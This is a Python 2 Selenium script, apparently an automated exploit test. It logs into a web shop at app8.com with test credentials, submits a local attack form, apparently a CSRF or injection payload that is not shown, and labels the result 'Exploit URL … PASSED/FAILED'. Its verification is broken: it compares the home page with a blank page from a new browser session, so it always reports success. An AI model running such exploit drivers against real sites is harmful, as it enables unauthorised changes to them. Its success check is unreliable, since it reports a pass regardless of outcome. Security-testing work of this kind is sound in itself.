import os
from phase4lib import check_login, update_results
from selenium import webdriver

browser = webdriver.Firefox("")
# Login to the website 
url = 'https://app8.com/upload/index.php?route=account/login'
browser.get(url)
browser.find_element_by_name('password').send_keys('test')
browser.find_element_by_name('email').send_keys('test@test.com')
browser.find_element_by_xpath("//form[@id='login']").submit()

# start executing

cur = os.getcwd()
browser.get(cur + "/formtemplate_1.html")
browser.find_element_by_xpath("//input[@type='submit' and @value='Submit']").submit()
injection_url = 'https://app8.com/upload/index.php?route=common/home'
browser.get(injection_url)
before = browser.page_source
browser.quit()

## Verification phase
browser = webdriver.Firefox("")

cur_url = browser.current_url
after = browser.page_source
outstr = "\Exploit URL: " + url + " "
if before != after:
	print '### PASSED ###'
	print '##### THE page source is changed!!! #####'
	update_results(outstr + " PASSED\n")
else:
	print '### FAILED ###'
	update_results(outstr + " FAILED\n")

browser.quit()
